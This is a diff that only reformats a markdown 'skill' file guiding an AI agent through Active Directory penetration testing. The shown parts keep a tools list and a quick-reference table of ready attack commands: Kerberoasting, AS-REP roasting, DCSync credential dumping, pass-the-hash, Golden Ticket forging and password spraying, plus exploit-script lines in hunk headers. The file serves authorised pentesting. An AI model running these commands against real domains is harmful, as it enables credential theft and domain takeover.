@@ -3,7 +3,7 @@ name: Active Directory Attacks
 description: This skill should be used when the user asks to "attack Active Directory", "exploit AD", "Kerberoasting", "DCSync", "pass-the-hash", "BloodHound enumeration", "Golden Ticket", "Silver Ticket", "AS-REP roasting", "NTLM relay", or needs guidance on Windows domain penetration testing.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: '1.1'
 ---
 
 # Active Directory Attacks
@@ -31,15 +31,15 @@ Provide comprehensive techniques for attacking Microsoft Active Directory enviro
 
 ## Essential Tools
 
-| Tool | Purpose |
-|------|---------|
-| BloodHound | AD attack path visualization |
-| Impacket | Python AD attack tools |
-| Mimikatz | Credential extraction |
-| Rubeus | Kerberos attacks |
-| CrackMapExec | Network exploitation |
-| PowerView | AD enumeration |
-| Responder | LLMNR/NBT-NS poisoning |
+| Tool         | Purpose                      |
+| ------------ | ---------------------------- |
+| BloodHound   | AD attack path visualization |
+| Impacket     | Python AD attack tools       |
+| Mimikatz     | Credential extraction        |
+| Rubeus       | Kerberos attacks             |
+| CrackMapExec | Network exploitation         |
+| PowerView    | AD enumeration               |
+| Responder    | LLMNR/NBT-NS poisoning       |
 
 ---
 
@@ -304,30 +304,33 @@ python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 
 ## Quick Reference
 
-| Attack | Tool | Command |
-|--------|------|---------|
-| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
-| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
-| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
-| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
-| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
-| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |
+| Attack        | Tool        | Command                                           |
+| ------------- | ----------- | ------------------------------------------------- |
+| Kerberoast    | Impacket    | `GetUserSPNs.py domain/user:pass -request`        |
+| AS-REP Roast  | Impacket    | `GetNPUsers.py domain/ -usersfile users.txt`      |
+| DCSync        | secretsdump | `secretsdump.py domain/admin:pass@DC`             |
+| Pass-the-Hash | psexec      | `psexec.py domain/user@target -hashes :HASH`      |
+| Golden Ticket | Mimikatz    | `kerberos::golden /user:Admin /krbtgt:HASH`       |
+| Spray         | kerbrute    | `kerbrute passwordspray -d domain users.txt Pass` |
 
 ---
 
 ## Constraints
 
 **Must:**
+
 - Synchronize time with DC before Kerberos attacks
 - Have valid domain credentials for most attacks
 - Document all compromised accounts
 
 **Must Not:**
+
 - Lock out accounts with excessive password spraying
 - Modify production AD objects without approval
 - Leave Golden Tickets without documentation
 
 **Should:**
+
 - Run BloodHound for attack path discovery
 - Check for SMB signing before relay attacks
 - Verify patch levels for CVE exploitation
@@ -368,13 +371,13 @@ python3 printerbug.py domain.local/user:pass@target 10.10.10.12
 
 ## Troubleshooting
 
-| Issue | Solution |
-|-------|----------|
-| Clock skew too great | Sync time with DC or use faketime |
-| Kerberoasting returns empty | No service accounts with SPNs |
-| DCSync access denied | Need Replicating Directory Changes rights |
-| NTLM relay fails | Check SMB signing, try LDAP target |
-| BloodHound empty | Verify collector ran with correct creds |
+| Issue                       | Solution                                  |
+| --------------------------- | ----------------------------------------- |
+| Clock skew too great        | Sync time with DC or use faketime         |
+| Kerberoasting returns empty | No service accounts with SPNs             |
+| DCSync access denied        | Need Replicating Directory Changes rights |
+| NTLM relay fails            | Check SMB signing, try LDAP target        |
+| BloodHound empty            | Verify collector ran with correct creds   |
 
 ---
 
